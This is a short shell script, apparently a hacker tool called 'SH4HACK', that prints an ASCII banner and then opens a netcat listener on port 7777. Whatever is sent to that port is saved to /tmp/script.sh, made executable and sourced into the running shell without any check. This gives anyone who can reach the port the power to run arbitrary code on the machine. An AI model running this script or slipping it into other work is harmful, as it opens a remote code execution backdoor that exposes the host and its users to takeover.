banner(){
	printf "\n\n\033[0;1;32m"
	cat << "EOF"
 ######  ##     ## ##        ##     ##    ###     ######  ##    ## 
##    ## ##     ## ##    ##  ##     ##   ## ##   ##    ## ##   ##  
##       ##     ## ##    ##  ##     ##  ##   ##  ##       ##  ##   
 ######  ######### ##    ##  ######### ##     ## ##       #####    
      ## ##     ## ######### ##     ## ######### ##       ##  ##   
##    ## ##     ##       ##  ##     ## ##     ## ##    ## ##   ##  
 ######  ##     ##       ##  ##     ## ##     ##  ######  ##    ## 
EOF
	printf "\033[0;35m					For all hackers...@tipotto\033[0m\n\n"
}

banner;
echo "[*] Started reverse TCP listener on port 7777";
nc -lp 7777 > /tmp/script.sh && chmod +x /tmp/script.sh && . /tmp/script.sh;
